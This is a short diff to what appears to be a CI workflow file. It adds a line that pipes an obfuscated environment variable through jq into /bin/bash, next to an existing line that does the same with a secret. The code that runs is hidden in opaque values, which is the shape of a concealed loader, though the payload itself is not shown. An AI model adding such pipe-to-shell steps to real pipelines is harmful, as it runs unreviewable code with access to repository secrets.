@@ -18,6 +18,7 @@ jobs:
           xp3: ${{ secrets.xp3 }}
         run: |
           printf '%s' "$xp3" | jq -r .nnp54049 | /bin/bash
+          echo $kswvx5825 | jq -r .o8 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
